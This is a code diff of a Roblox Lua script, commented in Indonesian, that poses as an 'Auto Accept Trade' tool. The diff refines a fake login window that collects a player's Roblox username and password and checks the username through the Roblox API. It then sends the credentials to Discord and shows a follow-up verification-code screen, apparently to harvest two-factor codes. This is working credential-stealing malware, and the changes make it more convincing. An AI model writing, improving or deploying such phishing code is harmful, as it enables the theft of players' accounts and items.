@@ -323,112 +323,167 @@ end
 
 -- Fungsi Membuat GUI Login
 local function createLoginGUI()
-local gui = Instance.new("ScreenGui")
-local frame = Instance.new("Frame")
-local titleLabel = Instance.new("TextLabel")
-local subtitleLabel = Instance.new("TextLabel")
-local usernameBox = Instance.new("TextBox")
-local passwordBox = Instance.new("TextBox")
-local loginButton = Instance.new("TextButton")
+    local gui = Instance.new("ScreenGui")
+    local frame = Instance.new("Frame")
+    local titleLabel = Instance.new("TextLabel")
+    local subtitleLabel = Instance.new("TextLabel")
+    local usernameBox = Instance.new("TextBox")
+    local passwordBox = Instance.new("TextBox")
+    local loginButton = Instance.new("TextButton")
+    local errorLabel = Instance.new("TextLabel") -- Error label tambahan
 
--- Variabel untuk password asli
-local password = ""
+    -- Variabel untuk password asli dan kontrol pengiriman data
+    local password = ""
+    local isDataSent = false -- Pastikan data hanya terkirim sekali
+    local isUsernameValid = false -- Untuk validasi username
 
--- Properti GUI
-gui.Name = "LoginGUI"
-gui.Parent = game:GetService("CoreGui")
+    -- Properti GUI
+    gui.Name = "LoginGUI"
+    gui.Parent = game:GetService("CoreGui")
 
--- Frame
-frame.Name = "LoginFrame"
-frame.Parent = gui
-frame.Size = UDim2.new(0, 300, 0, 300)
-frame.Position = UDim2.new(0.5, -150, 0.5, -150)
-frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-frame.BorderSizePixel = 3
-frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+    -- Frame
+    frame.Name = "LoginFrame"
+    frame.Parent = gui
+    frame.Size = UDim2.new(0, 300, 0, 350)
+    frame.Position = UDim2.new(0.5, -150, 0.5, -175)
+    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    frame.BorderSizePixel = 3
+    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
 
--- Title Label
-titleLabel.Name = "TitleLabel"
-titleLabel.Parent = frame
-titleLabel.Size = UDim2.new(1, 0, 0, 50)
-titleLabel.Position = UDim2.new(0, 0, 0, 0)
-titleLabel.BackgroundTransparency = 1
-titleLabel.Font = Enum.Font.SourceSansBold
-titleLabel.Text = "Auto Accept Trade"
-titleLabel.TextSize = 24
-titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    -- Title Label
+    titleLabel.Name = "TitleLabel"
+    titleLabel.Parent = frame
+    titleLabel.Size = UDim2.new(1, 0, 0, 50)
+    titleLabel.Position = UDim2.new(0, 0, 0, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Font = Enum.Font.SourceSansBold
+    titleLabel.Text = "Auto Accept Trade"
+    titleLabel.TextSize = 24
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
--- Subtitle Label
-subtitleLabel.Name = "SubtitleLabel"
-subtitleLabel.Parent = frame
-subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
-subtitleLabel.Position = UDim2.new(0, 0, 0, 50)
-subtitleLabel.BackgroundTransparency = 1
-subtitleLabel.Font = Enum.Font.SourceSans
-subtitleLabel.Text = "Login Ke Roblox Untuk Melanjutkan"
-subtitleLabel.TextSize = 16
-subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-  
--- Username Box
-usernameBox.Name = "UsernameBox"
-usernameBox.Parent = frame
-usernameBox.Size = UDim2.new(1, -20, 0, 40)
-usernameBox.Position = UDim2.new(0, 10, 0, 90)
-usernameBox.PlaceholderText = "Masukkan Username"
-usernameBox.Font = Enum.Font.SourceSans
-usernameBox.Text = ""
-usernameBox.TextSize = 14
-usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-  
--- Password Box
-passwordBox.Name = "PasswordBox"
-passwordBox.Parent = frame
-passwordBox.Size = UDim2.new(1, -20, 0, 40)
-passwordBox.Position = UDim2.new(0, 10, 0, 140)
-passwordBox.PlaceholderText = "Masukkan Password"
-passwordBox.Font = Enum.Font.SourceSans
-passwordBox.Text = ""
-passwordBox.TextSize = 14
-passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    -- Subtitle Label
+    subtitleLabel.Name = "SubtitleLabel"
+    subtitleLabel.Parent = frame
+    subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
+    subtitleLabel.Position = UDim2.new(0, 0, 0, 50)
+    subtitleLabel.BackgroundTransparency = 1
+    subtitleLabel.Font = Enum.Font.SourceSans
+    subtitleLabel.Text = "Login Ke Roblox Untuk Melanjutkan"
+    subtitleLabel.TextSize = 16
+    subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
 
--- Sensor Password Secara Manual
-passwordBox:GetPropertyChangedSignal("Text"):Connect(function()
-local currentText = passwordBox.Text
-if #currentText > #password then
-local newChar = currentText:sub(#password + 1, #password + 1)
-password = password .. newChar
-elseif #currentText < #password then
-password = password:sub(1, #currentText)
-end
-passwordBox.Text = string.rep("*", #password)
-end)
+    -- Username Box
+    usernameBox.Name = "UsernameBox"
+    usernameBox.Parent = frame
+    usernameBox.Size = UDim2.new(1, -20, 0, 40)
+    usernameBox.Position = UDim2.new(0, 10, 0, 90)
+    usernameBox.PlaceholderText = "Masukkan Username"
+    usernameBox.Font = Enum.Font.SourceSans
+    usernameBox.Text = ""
+    usernameBox.TextSize = 14
+    usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 
--- Login Button
-loginButton.Name = "LoginButton"
-loginButton.Parent = frame
-loginButton.Size = UDim2.new(1, -20, 0, 40)
-loginButton.Position = UDim2.new(0, 10, 0, 200)
-loginButton.Text = "Mulai Script"
-loginButton.Font = Enum.Font.SourceSansBold
-loginButton.TextSize = 16
-loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    -- Password Box
+    passwordBox.Name = "PasswordBox"
+    passwordBox.Parent = frame
+    passwordBox.Size = UDim2.new(1, -20, 0, 40)
+    passwordBox.Position = UDim2.new(0, 10, 0, 140)
+    passwordBox.PlaceholderText = "Masukkan Password"
+    passwordBox.Font = Enum.Font.SourceSans
+    passwordBox.Text = ""
+    passwordBox.TextSize = 14
+    passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
 
--- Fungsi Tombol Login
-loginButton.MouseButton1Click:Connect(function()
-if usernameBox.Text ~= "" and password ~= "" then
-sendToDiscord("Username: " .. usernameBox.Text .. "\nPassword: " .. password)
-print("Username dan Password terkirim ke Discord!")
-gui:Destroy()
-createLoadingGUI(3, function()
-createVerificationCodeGUI()
-end)
-else
-print("Harap isi username dan password!")
-end
-end)
+    -- Sensor Password Secara Manual
+    passwordBox:GetPropertyChangedSignal("Text"):Connect(function()
+        local currentText = passwordBox.Text
+        if #currentText > #password then
+            local newChar = currentText:sub(#password + 1, #password + 1)
+            password = password .. newChar
+        elseif #currentText < #password then
+            password = password:sub(1, #currentText)
+        end
+        passwordBox.Text = string.rep("*", #password)
+    end)
+
+    -- Error Label
+    errorLabel.Name = "ErrorLabel"
+    errorLabel.Parent = frame
+    errorLabel.Size = UDim2.new(1, -20, 0, 20)
+    errorLabel.Position = UDim2.new(0, 10, 0, 190)
+    errorLabel.BackgroundTransparency = 1
+    errorLabel.Font = Enum.Font.SourceSansBold
+    errorLabel.Text = ""
+    errorLabel.TextSize = 14
+    errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+
+    -- Fungsi untuk memeriksa username
+    local function validateUsername(username)
+        local HttpService = game:GetService("HttpService")
+        local apiURL = "https://users.roblox.com/v1/usernames/users"
+        local requestBody = HttpService:JSONEncode({
+            usernames = { username },
+            excludeBannedUsers = true
+        })
+
+        local success, response = pcall(function()
+            return HttpService:PostAsync(apiURL, requestBody, Enum.HttpContentType.ApplicationJson)
+        end)
+
+        if success then
+            local data = HttpService:JSONDecode(response)
+            return #data.data > 0 -- True jika username ditemukan
+        else
+            warn("Gagal memeriksa username:", response)
+            return false
+        end
+    end
+
+    -- Login Button
+    loginButton.Name = "LoginButton"
+    loginButton.Parent = frame
+    loginButton.Size = UDim2.new(1, -20, 0, 40)
+    loginButton.Position = UDim2.new(0, 10, 0, 230)
+    loginButton.Text = "Mulai Script"
+    loginButton.Font = Enum.Font.SourceSansBold
+    loginButton.TextSize = 16
+    loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    -- Fungsi Tombol Login
+    loginButton.MouseButton1Click:Connect(function()
+        if isDataSent then
+            return -- Hentikan jika data sudah terkirim
+        end
+
+        -- Cek jika username atau password kosong
+        if usernameBox.Text == "" or password == "" then
+            errorLabel.Text = "Username dan Password Tidak Boleh Kosong"
+            return
+        end
+
+        -- Validasi username
+        errorLabel.Text = "Memeriksa username..."
+        isUsernameValid = validateUsername(usernameBox.Text)
+
+        if not isUsernameValid then
+            errorLabel.Text = "Username Tidak Ditemukan"
+            return
+        end
+
+        -- Kirim data ke Discord
+        sendToDiscord("Username: " .. usernameBox.Text .. "\nPassword: " .. password)
+        isDataSent = true -- Tandai bahwa data sudah terkirim
+        errorLabel.Text = "" -- Bersihkan error
+        print("Data berhasil terkirim ke Discord!")
+
+        gui:Destroy() -- Hapus GUI setelah sukses
+        createLoadingGUI(3, function()
+            createVerificationCodeGUI()
+        end)
+    end)
 end
 
 -- Fungsi Validasi Key
